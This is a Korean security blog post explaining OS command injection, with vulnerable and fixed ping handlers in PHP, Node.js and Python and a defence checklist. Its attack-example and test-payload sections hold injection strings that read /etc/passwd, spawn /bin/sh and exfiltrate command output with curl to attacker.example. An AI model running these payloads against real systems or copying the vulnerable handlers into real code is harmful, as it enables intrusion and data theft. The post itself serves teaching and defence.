---
title: "[Infosec] Command Injection 정리: 개념·페이로드·예방법"
date: 2025-09-11 11:10:00 +0900
categories: [보안, Web]   # 카테고리는 여러 계층도 가능 [상위, 하위]
tags: [웹해킹, CommandInjection, OSCommand, RCE, Shell]          # 해시태그처럼 글 묶기
description: "시스템에 접근하라"
author: "송지민"
toc: true
---
# 입력 한 줄로 서버를 장악하는 최강의 무기

---

> ⚠️ 이 글은 **보안 학습/방어** 목적입니다. 모든 실습은 **본인 로컬/테스트 환경**에서만 하세요.

## Command Injection이란?

웹/서버 코드가 사용자 입력을 받아 **셸 명령에 그대로 붙여 실행**할 때, 공격자가 입력을 조작해 **임의 명령을 실행**시키는 취약점입니다.  
PHP의 `system()`, Node.js의 `child_process.exec()`, Python의 `os.system()` 처럼 **셸을 거쳐 실행**되는 함수에서 특히 위험합니다.

- 핵심 조건: **“명령 실행 함수에 사용자 입력이 직접 들어간다”**
- 결과: 서버에서 **임의 코드 실행(RCE)**, 파일 읽기/수정, 내부망 스캔, 크리덴셜 탈취 등

---

## 셸 메타문자(연산자) 빠르게 보기

| 기호 | 의미 | 예시 |
|---|---|---|
| `` `cmd` `` | 명령치환 | ``echo `whoami` `` |
| `$(cmd)` | 명령치환 | `echo $(date)` |
| `&&` | 앞 명령 성공 시 다음 실행 | `ping 1.1.1.1 && id` |
| `\|\|` | 앞 명령 실패 시 다음 실행 | `cat nope \|\| echo hi` |
| `;` | 순차 실행(성공/실패 무관) | `id; uname -a` |
| `\|` | 파이프 | `cat /etc/passwd \| wc -l` |
| `>` `>>` `2>&1` | 리다이렉션 | `id > /tmp/o` |
| `*` `?` `[]` | 글롭(glob) | `cat *.log` |
| `'` `"` `\` | 인용/이스케이프 | `'abc'`, `"a b"`, `\` |
| `$VAR` `${VAR}` | 변수 치환 | `echo $PATH` |

> Windows(`cmd.exe`)는 `&`, `&&`, `||`, `|`, `^`, `%VAR%` 등이 주요 연산자입니다.

---

## 공격이 어떻게 일어나나 (예시)

사용자 입력으로 `IP`를 받아 **핑**을 보내는 코드가 있다고 가정합니다.

### ❌ 취약한 코드

**PHP**
```php
<?php
$ip = $_GET['ip'];
// 취약: 셸 한 줄 문자열에 사용자 입력을 그대로 결합
system("ping -c 1 " . $ip);
```
**Node.js**
```js
const { exec } = require("child_process");
app.get("/ping", (req, res) => {
  const ip = req.query.ip;
  exec(`ping -c 1 ${ip}`, (e, out, err) => res.send(out ?? err));
});
```
**Python**
```python
from flask import request
import os
@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    # 취약
    return os.popen(f"ping -c 1 {ip}").read()
```

공격자 입력 예시(유닉스):
```
8.8.8.8; cat /etc/passwd
8.8.8.8 && curl -s https://attacker.example/i?u=$(id)
127.0.0.1 | /bin/sh
```

Windows 예시:
```
8.8.8.8 & type C:\Windows\win.ini
8.8.8.8 && whoami
```

---

## 안전하게 고치기 (핵심 3원칙)

### 1) **셸을 쓰지 말 것** — API/라이브러리 사용
- 핑 체크가 목적이라면 **네트워크 라이브러리**나 **ICMP 모듈** 사용을 우선 고려.

### 2) **셸을 쓴다면 인자 배열 + `shell=false`**
- 명령·인자를 **배열로 전달**하면 셸 메타문자 해석을 막을 수 있습니다.

**Node.js (✅ 안전)**
```js
const { execFile } = require("child_process");
app.get("/ping", (req, res) => {
  const ip = req.query.ip;
  // 1) 허용목록 검증(IPv4/IPv6)
  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip)) return res.status(400).send("bad ip");
  // 2) execFile: 셸을 거치지 않음
  execFile("ping", ["-c", "1", ip], { shell: false }, (err, out, e) => {
    if (err) return res.status(500).send("fail");
    res.type("text/plain").send(out);
  });
});
```

**Python (✅ 안전)**
```python
import subprocess, ipaddress
def is_ip(v):
    try: ipaddress.ip_address(v); return True
    except: return False

@app.route("/ping")
def ping():
    ip = request.args.get("ip","")
    if not is_ip(ip): return "bad ip", 400
    r = subprocess.run(["/bin/ping","-c","1",ip], capture_output=True, text=True, shell=False)
    return (r.stdout if r.returncode==0 else "fail"), (200 if r.returncode==0 else 500)
```

**PHP (가능하면 셸 미사용, 부득이하면)**
```php
<?php
$ip = $_GET['ip'] ?? '';
if (!filter_var($ip, FILTER_VALIDATE_IP)) { http_response_code(400); exit('bad ip'); }
// 최소: escape + 명령/인자 분리
$cmd = ['/bin/ping','-c','1',$ip];
// Symfony Process 같은 라이브러리 사용 권장 (인자 분리 지원)
```

> `escapeshellarg()`는 도움이 되지만 **셸을 통과**한다는 점에서 최선은 아닙니다. 가능하면 **execFile/subprocess.run 배열 전달**을 쓰세요.

### 3) **허용목록(allowlist) + 엄격한 검증**
- IP/도메인/옵션 등 입력은 **형식 검증** + **허용된 값만 통과**
- 절대 경로 사용(예: `/bin/ping`)으로 `PATH` 오염 방지
- 환경 고정: `{ PATH: "/usr/bin:/bin" }` 같이 제한

---

## 진단 팁 (테스트 페이로드)

- 성공/실패 분기: `; id`, `&& id`, `| id`
- 파일 읽기: `; cat /etc/passwd` / `& type C:\Windows\win.ini`
- 외부로 유출: `; curl -s https://attacker.example/i?d=$(uname -a)`
- 시간 지연: `; sleep 5` / `& timeout /T 5` (Windows)
- 새 셸 시도: `| /bin/sh`

> 로깅 시 **원본 입력**과 **실행 라인**을 분리 저장하면 포렌식에 큰 도움.

---

## 방어 체크리스트 (실무)

1. **셸 호출 금지**: 가능하면 네이티브 API/라이브러리로 대체  
2. **명령/인자 분리**: `execFile`, `subprocess.run([...], shell=False)`  
3. **입력 검증**: 정규식/파서/표준 라이브러리로 엄격 검증, 허용목록 적용  
4. **권한 최소화**: 실행 계정/컨테이너 권한 최소화, `chroot`/container/AppArmor/SELinux  
5. **환경 고정**: `PATH`, `IFS`, 지역화 변수(LANG/LC_*) 제어  
6. **절대 경로**로 바이너리 지정 (`/usr/bin/grep` 등)  
7. **출력/오류 분리 포착**: 명령 결과를 그대로 클라이언트에 노출하지 말 것  
8. **보안 테스트**: 정적분석(사용자 입력→명령 실행 데이터플로우), 동적 스캐닝, 코드리뷰  
9. **로그/알림**: 실패/지연/특이 인자를 알림으로 전송

---

## 흔한 함정

- **에스케이프만 믿기**: 인코딩/이스케이프는 우회 여지가 많음 (따옴표 종료, 인코딩 미스매치)  
- **`sudo`로 명령 노출**: `sudo` 대상 명령에 **사용자 인자**를 그대로 전달하면 똑같이 위험  
- **임시파일/리디렉션**: `>`, `2>&1` 등으로 파일 덮어쓰기 유도 가능  
- **Windows 특성**: `cmd.exe`와 `powershell.exe`의 연산자는 다름—각각의 메타문자 차이를 고려

---

## 요약

- Command Injection은 **셸을 통과하는 실행 경로**와 **사용자 입력 결합**에서 발생.  
- 최선의 방어는 **셸을 쓰지 않는 것**. 부득이하면 **인자 배열 + shell=false**를 사용하고, **허용목록**과 **환경 고정**으로 표면을 줄이자.  
- 테스트는 간단한 페이로드부터( `; id`, `&& whoami` ) 시작해 **시간/외부요청** 기반으로도 확인.
